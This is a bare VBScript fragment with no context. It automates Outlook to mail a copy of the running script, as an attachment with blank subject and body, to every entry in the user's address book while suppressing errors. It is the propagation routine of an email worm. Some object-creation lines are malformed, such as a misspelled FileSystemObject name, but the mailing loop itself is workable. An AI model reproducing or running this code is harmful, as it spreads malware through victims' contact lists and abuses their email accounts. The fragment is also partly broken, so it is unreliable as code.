   Dim x
   On Error Resume Next
   Set Fso = CreateObject("Scripting.FileSystem.Object")
   Set so = CreateObject(Fso)
   Set ol = CreateObject("Outlook.Application")
   Set out = Wscript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set A = mapi.AddressLists(1)
   For x = 1 To A.AddressEntries.Count
   Set Mail = ol.CreateItem(0)
   Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Mail.Subject = ""
   Mail.Body = ""
   Mail.Attachments.Add Wscript.ScriptFullName
   Mail.Send
   Next
